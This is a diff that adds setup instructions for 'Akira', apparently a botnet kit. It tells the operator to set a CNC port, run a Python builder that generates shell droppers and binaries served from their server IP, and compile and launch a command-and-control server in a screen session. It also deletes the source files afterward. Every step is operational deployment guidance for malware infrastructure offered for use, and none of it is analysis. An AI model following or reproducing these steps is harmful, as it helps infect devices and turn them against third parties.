@@ -1,0 +1,21 @@
+Edit line 51 in Akira.c with your desired CNC port
+Edit lines 37-52 in /AkiraBot/main.c accordingly, If you need help ask
+
+Make a Directory in /root/ named "Akira"
+Place /AkiraLogs/, Akira.c and DB.txt in /root/Akira/
+
+Place /AkiraBot/ and Akira.py in /root/ (Not in the /Akira/ Dir)
+
+Run:
+python Akira.py fff HOSTIP SHPREFIX DIRNAME
+Where HOSTIP is your Server IP, SHPREFIX is the prefix your .sh file will have, DIRNAME
+is the Directory that your Bins are placed in
+Ex: 'python Akira.py fff 192.168.100.254 RlkSeF Akira; rm -rf AkiraBot Akira.py'
+
+When it's done, run:
+cd /root/Akira/; gcc -o C2 Akira.c -pthread -w; rm -rf Akira.c; screen -S Akira ./C2 BOTPORT 1
+Where BOTPORT is your desired Botport, 1 is your threadcount
+Ex: 'cd /root/Akira/; gcc -o C2 Akira.c -pthread -w; rm -rf Akira.c; screen -S Akira ./C2 666 1'
+
+To view the screen:
+screen -xS Akira
